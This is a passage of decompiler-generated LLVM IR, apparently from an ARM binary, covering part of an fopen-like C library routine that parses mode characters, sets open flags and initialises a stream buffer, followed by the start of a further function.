  %v2_1401c = ptrtoint i32* %stack_var_-72 to i32
  %v0_14020 = load i32, i32* @r0, align 4
  store i32 %v0_14020, i32* @r6, align 4
  %v0_14024 = load i32, i32* @r2, align 4
  store i32 %v0_14024, i32* @sb, align 4
  %v0_14028 = load i32, i32* @r3, align 4
  store i32 %v0_14028, i32* @r5, align 4
  br i1 %v7_14014, label %dec_label_pc_14074, label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %dec_label_pc_14008
  %v7_14030 = icmp eq i8 %v2_1400c, 119
  br i1 %v7_14030, label %bb, label %dec_label_pc_1403c

bb:                                               ; preds = %dec_label_pc_14030
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_14078

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14030
  %v7_1403c = icmp eq i8 %v2_1400c, 97
  br i1 %v7_1403c, label %bb32, label %dec_label_pc_14048

bb32:                                             ; preds = %dec_label_pc_1403c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_14078

dec_label_pc_14048:                               ; preds = %dec_label_pc_1403c, %dec_label_pc_140fc, %dec_label_pc_140d0
  %v0_14048 = call i32 @function_10a30()
  store i32 %v0_14048, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_14050 = load i32, i32* @sb, align 4
  %v2_14050 = icmp eq i32 %v0_14050, 0
  %v2_14054 = inttoptr i32 %v0_14048 to i32*
  store i32 22, i32* %v2_14054, align 4
  br i1 %v2_14050, label %dec_label_pc_142c8, label %dec_label_pc_1405c

dec_label_pc_1405c:                               ; preds = %dec_label_pc_14120._crit_edge, %dec_label_pc_14048
  %v0_1405c = load i32, i32* @sb, align 4
  %v1_1405c = inttoptr i32 %v0_1405c to i16*
  %v2_1405c = load i16, i16* %v1_1405c, align 2
  %v3_1405c = zext i16 %v2_1405c to i32
  store i32 %v3_1405c, i32* %r3.global-to-local, align 4
  %v1_14060 = and i32 %v3_1405c, 8192
  %v2_14060 = icmp eq i32 %v1_14060, 0
  br i1 %v2_14060, label %dec_label_pc_142c8, label %dec_label_pc_14068

dec_label_pc_14068:                               ; preds = %dec_label_pc_1405c
  store i32 %v0_1405c, i32* @r0, align 4
  %v0_1406c = call i32 @function_120a4()
  store i32 %v0_1406c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142c8

dec_label_pc_14074:                               ; preds = %dec_label_pc_14008
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %bb, %bb32, %dec_label_pc_14074
  %v1_14090 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_14074 ]
  %v1_14078 = add i32 %v0_1400c, 1
  %v2_14078 = inttoptr i32 %v1_14078 to i8*
  %v3_14078 = load i8, i8* %v2_14078, align 1
  %v7_1407c = icmp eq i8 %v3_14078, 98
  %v1_14078.v0_1400c = select i1 %v7_1407c, i32 %v1_14078, i32 %v0_1400c
  store i32 %v1_14078.v0_1400c, i32* %r3.global-to-local, align 4
  %v1_14088 = add i32 %v1_14078.v0_1400c, 1
  %v2_14088 = inttoptr i32 %v1_14088 to i8*
  %v3_14088 = load i8, i8* %v2_14088, align 1
  %v4_14088 = zext i8 %v3_14088 to i32
  store i32 %v4_14088, i32* @r3, align 4
  %v7_1408c = icmp eq i8 %v3_14088, 43
  br i1 %v7_1408c, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_14078
  store i32 %v1_14090, i32* @r3, align 4
  %v2_14094 = add nuw nsw i32 %v1_14090, 1
  store i32 %v2_14094, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14078, %bb35
  %v2_14098 = icmp eq i32 %v0_14024, 0
  br i1 %v2_14098, label %dec_label_pc_140a0, label %dec_label_pc_140c8

dec_label_pc_140a0:                               ; preds = %.thread3
  store i32 80, i32* @r0, align 4
  %v0_140a4 = call i32 @function_11038()
  store i32 %v0_140a4, i32* %r0.global-to-local, align 4
  store i32 %v0_140a4, i32* @sb, align 4
  %v3_140a8 = icmp eq i32 %v0_140a4, 0
  br i1 %v3_140a8, label %dec_label_pc_142cc, label %dec_label_pc_140b0

dec_label_pc_140b0:                               ; preds = %dec_label_pc_140a0
  %v2_140b4 = add i32 %v0_140a4, 8
  %v3_140b4 = inttoptr i32 %v2_140b4 to i32*
  store i32 0, i32* %v3_140b4, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_140bc = load i32, i32* @sb, align 4
  %v3_140bc = inttoptr i32 %v2_140bc to i16*
  store i16 8192, i16* %v3_140bc, align 2
  %v0_140c0 = load i32, i32* @sb, align 4
  %v1_140c0 = add i32 %v0_140c0, 56
  store i32 %v1_140c0, i32* @r0, align 4
  %v1_140c4 = call i32 @function_14378(i32 %v1_140c0)
  store i32 %v1_140c4, i32* %r0.global-to-local, align 4
  %v0_140c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_140c8

dec_label_pc_140c8:                               ; preds = %.thread3, %dec_label_pc_140b0
  %v0_14120 = phi i32 [ %v0_14028, %.thread3 ], [ %v0_140c8.pre, %dec_label_pc_140b0 ]
  %v1_140c8 = icmp slt i32 %v0_14120, 0
  br i1 %v1_140c8, label %dec_label_pc_14120, label %dec_label_pc_140d0

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140c8
  %v0_140d4 = load i32, i32* @r4, align 4
  %v2_140d4 = and i32 %v0_140d4, ptrtoint (i32* @global_var_20003.528 to i32)
  %v1_140d8 = or i32 %v2_140d4, 1
  store i32 %v1_140d8, i32* %r2.global-to-local, align 4
  %v0_140dc = load i32, i32* @r6, align 4
  %v1_140dc = add i32 %v0_140dc, 1
  %v2_140e0 = and i32 %v1_140dc, %v1_140d8
  store i32 %v2_140e0, i32* %r3.global-to-local, align 4
  %v9_140e4 = icmp eq i32 %v2_140e0, %v1_140d8
  %v1_140e8 = load i32, i32* @sb, align 4
  %v2_140e8 = add i32 %v1_140e8, 4
  %v3_140e8 = inttoptr i32 %v2_140e8 to i32*
  store i32 %v0_14120, i32* %v3_140e8, align 4
  br i1 %v9_140e4, label %dec_label_pc_140f0, label %dec_label_pc_14048

dec_label_pc_140f0:                               ; preds = %dec_label_pc_140d0
  %v0_140f0 = load i32, i32* @r4, align 4
  %v1_140f0 = load i32, i32* @r6, align 4
  %v2_140f0 = sub i32 -1, %v1_140f0
  %v3_140f0 = and i32 %v0_140f0, %v2_140f0
  store i32 %v3_140f0, i32* @r3, align 4
  %v1_140f4 = and i32 %v3_140f0, 1024
  %v2_140f4 = icmp eq i32 %v1_140f4, 0
  br i1 %v2_140f4, label %dec_label_pc_14114, label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140f0
  %v0_140fc = load i32, i32* @r5, align 4
  store i32 %v0_140fc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_14108 = call i32 @function_1043c(i32 %v0_140fc, i32 4)
  store i32 %v2_14108, i32* %r0.global-to-local, align 4
  %v2_1410c = icmp eq i32 %v2_14108, 0
  br i1 %v2_1410c, label %dec_label_pc_140fc.dec_label_pc_14114_crit_edge, label %dec_label_pc_14048

dec_label_pc_140fc.dec_label_pc_14114_crit_edge:  ; preds = %dec_label_pc_140fc
  %v0_14114.pre = load i32, i32* @r6, align 4
  %v0_14118.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_140fc.dec_label_pc_14114_crit_edge, %dec_label_pc_140f0
  %v0_14118 = phi i32 [ %v0_14118.pre, %dec_label_pc_140fc.dec_label_pc_14114_crit_edge ], [ %v0_140f0, %dec_label_pc_140f0 ]
  %v0_14114 = phi i32 [ %v0_14114.pre, %dec_label_pc_140fc.dec_label_pc_14114_crit_edge ], [ %v1_140f0, %dec_label_pc_140f0 ]
  %v1_14114 = and i32 %v0_14114, 131072
  store i32 %v1_14114, i32* %r3.global-to-local, align 4
  %v2_14118 = or i32 %v1_14114, %v0_14118
  store i32 %v2_14118, i32* @r4, align 4
  br label %dec_label_pc_14144

dec_label_pc_14120:                               ; preds = %dec_label_pc_140c8
  %v7_14120 = icmp eq i32 %v0_14120, -1
  %v0_1412c.pre = load i32, i32* @r4, align 4
  br i1 %v7_14120, label %dec_label_pc_14120._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_14120
  %v2_14124 = or i32 %v0_1412c.pre, ptrtoint (i32* @global_var_20000.529 to i32)
  store i32 %v2_14124, i32* @r4, align 4
  br label %dec_label_pc_14120._crit_edge

dec_label_pc_14120._crit_edge:                    ; preds = %dec_label_pc_14120, %bb36
  %v0_1412c = phi i32 [ %v2_14124, %bb36 ], [ %v0_1412c.pre, %dec_label_pc_14120 ]
  %v0_14128 = load i32, i32* @r6, align 4
  store i32 %v0_14128, i32* %r0.global-to-local, align 4
  store i32 %v0_1412c, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_14134 = call i32 @function_101e0(i32 %v0_14128, i32 %v0_1412c)
  store i32 %v2_14134, i32* %r0.global-to-local, align 4
  %v1_14138 = icmp slt i32 %v2_14134, 0
  %v1_1413c = load i32, i32* @sb, align 4
  %v2_1413c = add i32 %v1_1413c, 4
  %v3_1413c = inttoptr i32 %v2_1413c to i32*
  store i32 %v2_14134, i32* %v3_1413c, align 4
  br i1 %v1_14138, label %dec_label_pc_1405c, label %.dec_label_pc_14144_crit_edge

.dec_label_pc_14144_crit_edge:                    ; preds = %dec_label_pc_14120._crit_edge
  %v0_14148.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %.dec_label_pc_14144_crit_edge, %dec_label_pc_14114
  %v0_14160 = phi i32 [ %v0_14148.pre, %.dec_label_pc_14144_crit_edge ], [ %v2_14118, %dec_label_pc_14114 ]
  %v0_14144 = load i32, i32* @sb, align 4
  %v1_14144 = inttoptr i32 %v0_14144 to i16*
  %v2_14144 = load i16, i16* %v1_14144, align 2
  %v3_14144 = zext i16 %v2_14144 to i32
  %v1_14148 = urem i32 %v0_14160, 4
  %v1_1414c = and i32 %v0_14160, 1024
  %v1_14150 = and i32 %v3_14144, 8192
  %v1_14154 = add nuw nsw i32 %v1_14148, 1
  %v2_14158 = or i32 %v1_14150, %v1_1414c
  store i32 %v2_14158, i32* %r3.global-to-local, align 4
  %v1_1415c = xor i32 %v1_14154, 3
  store i32 %v1_1415c, i32* %r1.global-to-local, align 4
  %v1_14160 = and i32 %v0_14160, ptrtoint (i32* @global_var_20000.529 to i32)
  store i32 %v1_14160, i32* %r2.global-to-local, align 4
  %v2_14160 = icmp eq i32 %v1_14160, 0
  %v1_14164 = add i32 %v0_14144, 4
  %v2_14164 = inttoptr i32 %v1_14164 to i32*
  %v3_14164 = load i32, i32* %v2_14164, align 4
  store i32 %v3_14164, i32* @r5, align 4
  br i1 %v2_14160, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_14144
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_14144, %bb37
  %v0_14170 = phi i32 [ 0, %dec_label_pc_14144 ], [ 32768, %bb37 ]
  %v4_1416c = mul nuw nsw i32 %v1_1415c, 16
  %v5_1416c = or i32 %v2_14158, %v4_1416c
  store i32 %v5_1416c, i32* %r3.global-to-local, align 4
  %v2_14170 = or i32 %v0_14170, %v5_1416c
  store i32 %v2_14170, i32* %r2.global-to-local, align 4
  %v8_14174 = icmp eq i32 %v3_14164, 2147483647
  %v1_14178 = trunc i32 %v2_14170 to i16
  store i16 %v1_14178, i16* %v1_14144, align 2
  br i1 %v8_14174, label %dec_label_pc_141a8, label %dec_label_pc_14180

dec_label_pc_14180:                               ; preds = %bb38
  %v0_14180 = call i32 @function_10a30()
  store i32 %v0_14180, i32* @r4, align 4
  %v0_14188 = load i32, i32* @r5, align 4
  store i32 %v0_14188, i32* @r0, align 4
  %v1_1418c = inttoptr i32 %v0_14180 to i32*
  %v2_1418c = load i32, i32* %v1_1418c, align 4
  store i32 %v2_1418c, i32* @r5, align 4
  %v1_14190 = call i32 @function_1537c(i32 %v0_14188)
  store i32 %v1_14190, i32* %r0.global-to-local, align 4
  %v2_14194 = icmp eq i32 %v1_14190, 0
  br i1 %v2_14194, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_14180
  %v1_14198 = load i32, i32* @sb, align 4
  %v2_14198 = inttoptr i32 %v1_14198 to i16*
  %v3_14198 = load i16, i16* %v2_14198, align 2
  %v4_14198 = zext i16 %v3_14198 to i32
  %v2_1419c = or i32 %v4_14198, 256
  store i32 %v2_1419c, i32* %r3.global-to-local, align 4
  %v2_141a0 = trunc i32 %v2_1419c to i16
  store i16 %v2_141a0, i16* %v2_14198, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14180, %bb39
  %v0_141a4 = load i32, i32* @r5, align 4
  %v1_141a4 = load i32, i32* @r4, align 4
  %v2_141a4 = inttoptr i32 %v1_141a4 to i32*
  store i32 %v0_141a4, i32* %v2_141a4, align 4
  br label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %bb38, %.thread5
  %v0_141a8 = load i32, i32* @sb, align 4
  %v1_141a8 = add i32 %v0_141a8, 8
  %v2_141a8 = inttoptr i32 %v1_141a8 to i32*
  %v3_141a8 = load i32, i32* %v2_141a8, align 4
  store i32 %v3_141a8, i32* %r3.global-to-local, align 4
  %v2_141ac = icmp eq i32 %v3_141a8, 0
  br i1 %v2_141ac, label %dec_label_pc_141b4, label %bb40

dec_label_pc_141b4:                               ; preds = %dec_label_pc_141a8
  store i32 4096, i32* @r0, align 4
  %v0_141b8 = call i32 @function_11038()
  store i32 %v0_141b8, i32* %r0.global-to-local, align 4
  %v2_141bc = icmp eq i32 %v0_141b8, 0
  %v1_141cc.pre = load i32, i32* @sb, align 4
  br i1 %v2_141bc, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_141b4
  %v2_141c0 = inttoptr i32 %v1_141cc.pre to i16*
  %v3_141c0 = load i16, i16* %v2_141c0, align 2
  %v4_141c0 = zext i16 %v3_141c0 to i32
  %v2_141c4 = add i32 %v0_141b8, 4096
  store i32 %v2_141c4, i32* %r2.global-to-local, align 4
  %v2_141c8 = or i32 %v4_141c0, 16384
  store i32 %v2_141c8, i32* %r3.global-to-local, align 4
  %v2_141cc = add i32 %v1_141cc.pre, 8
  %v3_141cc = inttoptr i32 %v2_141cc to i32*
  store i32 %v0_141b8, i32* %v3_141cc, align 4
  %v1_141d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_141d0 = load i32, i32* @sb, align 4
  %v3_141d0 = add i32 %v2_141d0, 12
  %v4_141d0 = inttoptr i32 %v3_141d0 to i32*
  store i32 %v1_141d0, i32* %v4_141d0, align 4
  %v1_141d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_141d4 = trunc i32 %v1_141d4 to i16
  %v3_141d4 = load i32, i32* @sb, align 4
  %v4_141d4 = inttoptr i32 %v3_141d4 to i16*
  store i16 %v2_141d4, i16* %v4_141d4, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_141b4
  %v2_141cc19 = add i32 %v1_141cc.pre, 8
  %v3_141cc20 = inttoptr i32 %v2_141cc19 to i32*
  store i32 0, i32* %v3_141cc20, align 4
  %v2_141d8 = load i32, i32* @sb, align 4
  %v3_141d8 = add i32 %v2_141d8, 12
  %v4_141d8 = inttoptr i32 %v3_141d8 to i32*
  store i32 0, i32* %v4_141d8, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_141a8, %.thread9
  store i32 56, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_141e4 = load i32, i32* @fp, align 4
  %v2_141e4 = add i32 %v0_141e4, 56
  %v3_141e4 = inttoptr i32 %v2_141e4 to i32*
  %v4_141e4 = load i32, i32* %v3_141e4, align 4
  store i32 %v4_141e4, i32* %r3.global-to-local, align 4
  %v2_141e8 = load i32, i32* @sb, align 4
  %v3_141e8 = add i32 %v2_141e8, 2
  %v4_141e8 = inttoptr i32 %v3_141e8 to i8*
  store i8 0, i8* %v4_141e8, align 1
  %v0_141ec = load i32, i32* @sb, align 4
  %v1_141ec = inttoptr i32 %v0_141ec to i16*
  %v2_141ec = load i16, i16* %v1_141ec, align 2
  %v3_141ec = zext i16 %v2_141ec to i32
  store i32 %v3_141ec, i32* %r2.global-to-local, align 4
  %v0_141f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_141f0 = inttoptr i32 %v0_141f0 to i32*
  %v2_141f0 = load i32, i32* %v1_141f0, align 4
  store i32 %v2_141f0, i32* %r1.global-to-local, align 4
  %v1_141f4 = add i32 %v0_141ec, 8
  %v2_141f4 = inttoptr i32 %v1_141f4 to i32*
  %v3_141f4 = load i32, i32* %v2_141f4, align 4
  store i32 %v3_141f4, i32* %r3.global-to-local, align 4
  %v1_141f8 = and i32 %v3_141ec, 8192
  %v2_141f8 = icmp eq i32 %v1_141f8, 0
  %v2_141fc = add i32 %v0_141ec, 20
  %v3_141fc = inttoptr i32 %v2_141fc to i32*
  store i32 %v3_141f4, i32* %v3_141fc, align 4
  %v0_14200 = load i32, i32* %r0.global-to-local, align 4
  %v1_14200 = load i32, i32* @sb, align 4
  %v2_14200 = add i32 %v1_14200, 44
  %v3_14200 = inttoptr i32 %v2_14200 to i32*
  store i32 %v0_14200, i32* %v3_14200, align 4
  %v0_14204 = load i32, i32* %r1.global-to-local, align 4
  %v1_14204 = load i32, i32* @sb, align 4
  %v2_14204 = add i32 %v1_14204, 52
  %v3_14204 = inttoptr i32 %v2_14204 to i32*
  store i32 %v0_14204, i32* %v3_14204, align 4
  %v0_14208 = load i32, i32* %r3.global-to-local, align 4
  %v1_14208 = load i32, i32* @sb, align 4
  %v2_14208 = add i32 %v1_14208, 24
  %v3_14208 = inttoptr i32 %v2_14208 to i32*
  store i32 %v0_14208, i32* %v3_14208, align 4
  %v0_1420c = load i32, i32* %r3.global-to-local, align 4
  %v1_1420c = load i32, i32* @sb, align 4
  %v2_1420c = add i32 %v1_1420c, 28
  %v3_1420c = inttoptr i32 %v2_1420c to i32*
  store i32 %v0_1420c, i32* %v3_1420c, align 4
  %v0_14210 = load i32, i32* %r3.global-to-local, align 4
  %v1_14210 = load i32, i32* @sb, align 4
  %v2_14210 = add i32 %v1_14210, 16
  %v3_14210 = inttoptr i32 %v2_14210 to i32*
  store i32 %v0_14210, i32* %v3_14210, align 4
  br i1 %v2_141f8, label %dec_label_pc_142cc, label %dec_label_pc_14218

dec_label_pc_14218:                               ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_1421c = load i32, i32* @fp, align 4
  %v2_1421c = add i32 %v0_1421c, 36
  %v3_1421c = inttoptr i32 %v2_1421c to i32*
  %v4_1421c = load i32, i32* %v3_1421c, align 4
  store i32 %v4_1421c, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_14224 = add i32 %v0_1421c, 108
  %v3_14224 = inttoptr i32 %v2_14224 to i32*
  %v4_14224 = load i32, i32* %v3_14224, align 4
  store i32 %v4_14224, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_1422c = ptrtoint i32* %stack_var_-56 to i32
  %v2_14230 = add i32 %v0_1421c, 72
  %v3_14230 = inttoptr i32 %v2_14230 to i32*
  %v4_14230 = load i32, i32* %v3_14230, align 4
  store i32 %v4_1421c, i32* %r1.global-to-local, align 4
  store i32 %v4_14224, i32* %r2.global-to-local, align 4
  store i32 %v2_1422c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14230)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1424c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1424c, i32* %r0.global-to-local, align 4
  %v0_14250 = load i32, i32* @fp, align 4
  %v2_14250 = add i32 %v0_14250, 16
  %v3_14250 = inttoptr i32 %v2_14250 to i32*
  %v4_14250 = load i32, i32* %v3_14250, align 4
  call void @__pseudo_branch(i32 %v4_14250)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_14260 = load i32, i32* @fp, align 4
  %v2_14260 = add i32 %v0_14260, 96
  %v3_14260 = inttoptr i32 %v2_14260 to i32*
  %v4_14260 = load i32, i32* %v3_14260, align 4
  store i32 %v4_14260, i32* %r4.global-to-local, align 4
  %v0_14264 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14264, i32* %r1.global-to-local, align 4
  store i32 %v4_14260, i32* %r2.global-to-local, align 4
  store i32 %v2_1401c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14230)
  store i32 %v4_14260, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14250)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14288 = load i32, i32* @fp, align 4
  %v2_14288 = add i32 %v0_14288, 44
  %v3_14288 = inttoptr i32 %v2_14288 to i32*
  %v4_14288 = load i32, i32* %v3_14288, align 4
  store i32 %v4_14288, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_14290 = inttoptr i32 %v4_14288 to i32*
  %v2_14290 = load i32, i32* %v1_14290, align 4
  store i32 %v2_14290, i32* %r2.global-to-local, align 4
  store i32 %v2_1401c, i32* %r0.global-to-local, align 4
  %v1_14298 = load i32, i32* @sb, align 4
  %v2_14298 = add i32 %v1_14298, 32
  %v3_14298 = inttoptr i32 %v2_14298 to i32*
  store i32 %v2_14290, i32* %v3_14298, align 4
  %v0_1429c = load i32, i32* @fp, align 4
  %v1_1429c = load i32, i32* %r3.global-to-local, align 4
  %v2_1429c = add i32 %v1_1429c, %v0_1429c
  %v3_1429c = inttoptr i32 %v2_1429c to i32*
  %v4_1429c = load i32, i32* %v3_1429c, align 4
  store i32 %v4_1429c, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_142a4 = load i32, i32* @sb, align 4
  %v1_142a4 = load i32, i32* @ip, align 4
  %v2_142a4 = inttoptr i32 %v1_142a4 to i32*
  store i32 %v0_142a4, i32* %v2_142a4, align 4
  call void @__pseudo_branch(i32 %v4_1429c)
  store i32 %v2_1422c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1429c)
  br label %dec_label_pc_142cc

dec_label_pc_142c8:                               ; preds = %dec_label_pc_1405c, %dec_label_pc_14048, %dec_label_pc_14068
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_142cc

dec_label_pc_142cc:                               ; preds = %bb40, %dec_label_pc_140a0, %dec_label_pc_14218, %dec_label_pc_142c8
  %v0_142cc = load i32, i32* @sb, align 4
  store i32 %v0_142cc, i32* %r0.global-to-local, align 4
  %v2_142d4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_142d4, i32* %r4.global-to-local, align 4
  store i32 %v6_14008, i32* @r5, align 4
  store i32 %v9_14008, i32* @r6, align 4
  store i32 %v18_14008, i32* @sb, align 4
  store i32 %v24_14008, i32* @fp, align 4
  ret i32 %v0_142cc

; uselistorder directives
  uselistorder i32 %v1_141cc.pre, { 2, 1, 0 }
  uselistorder i32 %v0_14160, { 1, 2, 0 }
  uselistorder i32 %v0_1412c, { 1, 0 }
  uselistorder i32 %v1_140f0, { 1, 0 }
  uselistorder i32 %v0_140f0, { 1, 0 }
  uselistorder i32 %v1_140d8, { 1, 0, 2 }
  uselistorder i32 %v1_14090, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 14, 13, 15, 16, 17, 18 }
  uselistorder i32 16384, { 22, 0, 23, 2, 31, 14, 32, 16, 24, 17, 25, 18, 26, 5, 27, 15, 28, 3, 29, 4, 30, 6, 33, 19, 34, 7, 1, 8, 35, 9, 36, 11, 37, 10, 38, 12, 39, 13, 40, 21, 41, 42, 43, 20, 44 }
  uselistorder i32 4096, { 9, 10, 11, 2, 0, 3, 16, 4, 1, 12, 6, 13, 7, 5, 8, 14, 15 }
  uselistorder i32 32768, { 1, 5, 2, 0, 4, 3 }
  uselistorder i32 (i32, i32)* @function_101e0, { 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_1043c, { 12, 0, 11, 8, 7, 10, 9, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 6, 7, 1, 8 }
  uselistorder i32 ()* @function_11038, { 60, 59, 58, 4, 3, 2, 0, 1, 6, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5 }
  uselistorder i32 80, { 6, 3, 4, 5, 1, 2, 7, 0, 8 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @function_120a4, { 12, 11, 5, 4, 3, 2, 0, 8, 7, 6, 10, 9, 1 }
  uselistorder i32* @fp, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 74, 75, 76, 77, 82, 84, 83, 85, 18, 19, 20, 21, 22, 23, 24, 25, 36, 37, 38, 39, 40, 41, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 43, 44, 45, 46, 47, 48, 49, 50, 51, 54, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 78, 79, 80, 81 }
  uselistorder i32* @sb, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 89, 90, 91, 92, 93, 94, 95, 96, 101, 104, 102, 103, 105, 33, 34, 35, 36, 37, 45, 46, 47, 48, 49, 38, 39, 40, 41, 42, 43, 44, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 97, 98, 99, 100, 106, 107, 108, 109, 110, 111, 112 }
  uselistorder label %dec_label_pc_142cc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_142c8, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_141a8, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_14120._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_140c8, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14078, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14048, { 1, 2, 0 }
}

define i32 @function_142e0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_142e0:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_142e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_142e0, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_142e0
  %v1_142e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_142e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_142e8 = and i32 %v2_142e8, %v1_142e8
  %v2_142ec = trunc i32 %v3_142e8 to i16
  %v4_142ec = inttoptr i32 %v3_142e8 to i16*
  store i16 %v2_142ec, i16* %v4_142ec, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_142e0, %bb
  %v0_14314 = call i32 @function_10a30()
  store i32 %v0_14314, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_14320 = inttoptr i32 %v0_14314 to i32*
  %v2_14320 = load i32, i32* %v1_14320, align 4
  store i32 %v2_14320, i32* @r6, align 4
  %v1_14324 = call i32 @function_1537c(i32 0)
  %v2_1432c = icmp eq i32 %v1_14324, 0
  store i32 123764, i32* @r4, align 4
  br i1 %v2_1432c, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 304, i32* %r2.global-to-local, align 4
  %v5_14338 = load i16, i16* inttoptr (i32 124068 to i16*), align 4
  %v7_14338 = zext i16 %v5_14338 to i32
  %v2_1433c = xor i32 %v7_14338, 256
  store i32 %v2_1433c, i32* @r3, align 4
  %v2_14340 = trunc i32 %v2_1433c to i16
  store i16 %v2_14340, i16* inttoptr (i32 124068 to i16*), align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_14348 = call i32 @function_1537c(i32 1)
  %v2_1434c = icmp eq i32 %v1_14348, 0
  br i1 %v2_1434c, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_14354 = load i32, i32* @r4, align 4
  %v3_14354 = add i32 %v1_14354, 304
  store i32 %v3_14354, i32* %r2.global-to-local, align 4
  %v2_14358 = add i32 %v1_14354, 384
  %v3_14358 = inttoptr i32 %v2_14358 to i16*
